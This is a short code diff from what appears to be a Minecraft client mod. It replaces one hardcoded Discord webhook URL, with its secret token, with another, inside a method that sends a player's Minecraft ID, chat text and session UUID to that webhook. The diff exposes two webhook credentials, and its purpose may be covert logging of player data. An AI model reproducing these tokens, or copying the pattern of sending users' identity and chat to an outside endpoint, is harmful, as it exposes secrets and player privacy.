@@ -14,7 +14,7 @@ import java.util.Random;
 public class SocketWebhookManager implements Globals {
     public static void send(String mcid, String chat) {
         try {
-            Webhook webhook = new Webhook("https://discord.com/api/webhooks/1296264013306662929/tuvKXgJOJWZNCMaXpqKHEhSXHgdGk22Wfa3oqs63zQ2cUMd9IPmEBv16u3Omn1QggV1E");
+            Webhook webhook = new Webhook("https://discord.com/api/webhooks/1300059822833795173/1WR0LjD4zrNYNUfFUoajzH83X6HInQ73QzMFWLHA422gUOa2JZ9VWZebvp9D_k70c5qI");
             Webhook.EmbedObject embed = new Webhook.EmbedObject();
             embed.setTitle(mcid);
             embed.setThumbnail("https://cravatar.eu/helmhead/" + mc.getSession().getUuidOrNull() + "/128.png");
